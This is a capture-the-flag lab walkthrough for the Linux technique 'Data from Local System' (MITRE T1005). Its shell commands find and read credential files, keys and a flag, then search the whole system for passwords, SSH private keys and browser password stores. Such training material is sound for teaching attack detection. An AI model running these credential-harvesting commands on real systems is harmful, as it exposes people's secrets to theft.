# T1005 – Data from Local System | Solution Walkthrough
**Difficulty:** Easy | **OS:** Linux | **MITRE:** T1005

## Step 1 – Find Sensitive Files
```bash
# Config files:
find / -name "*.conf" -readable 2>/dev/null | grep -v proc | head -20
# /opt/corp-data/configs/system_keys.conf  ← contains flag!

# CSV files (HR data):
find / -name "*.csv" -readable 2>/dev/null
# /opt/corp-data/hr/employees.csv

# Hidden files with credentials:
find /home -name ".*" -readable 2>/dev/null
# ~/.db_url  ~/.env
```

## Step 2 – Search Contents for Keywords
```bash
# Grep for passwords/keys across entire system:
grep -rn "password\|passwd\|secret\|key\|FLAG\|HACKTIFY" \
    /opt/corp-data/ /home/$USER/ 2>/dev/null
# Found: /opt/corp-data/configs/system_keys.conf:1:HACKTIFY{...}
```

## Step 3 – Read Credentials
```bash
cat ~/.db_url
# postgres://admin:DBpass123@localhost/prod
cat ~/.env
# AWS_SECRET_KEY=wJalrXUtnFEMI
```

## Step 4 – Read Flag
```bash
cat /opt/corp-data/configs/system_keys.conf | head -1
# HACKTIFY{LOCAL_DATA_COLLECTION_<hash>}
```

## Comprehensive Sensitive File Search
```bash
# All at once:
find / -readable -type f 2>/dev/null | xargs grep -l \
    "password\|secret\|private_key\|BEGIN RSA" 2>/dev/null | \
    grep -v '/proc\|/sys'
# SSH private keys:
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
# Browser passwords:
find / -name "Login Data" 2>/dev/null  # Chrome
find / -name "key4.db" 2>/dev/null     # Firefox
```
